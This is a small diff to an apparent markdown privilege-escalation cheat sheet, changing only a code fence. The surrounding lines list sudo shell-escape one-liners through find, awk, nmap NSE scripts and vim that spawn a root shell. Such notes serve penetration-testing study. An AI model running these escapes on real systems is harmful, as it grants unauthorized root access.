@@ -32,7 +32,7 @@ sudo find /bin -name nano -exec /bin/sh \;
 sudo awk 'BEGIN {system("/bin/sh")}'  
 echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse 
 sudo vim -c '!sh'
-~~~
+~~~~~~
 # test
 ~~~
 1. Notice the list of programs that can run via sudo 
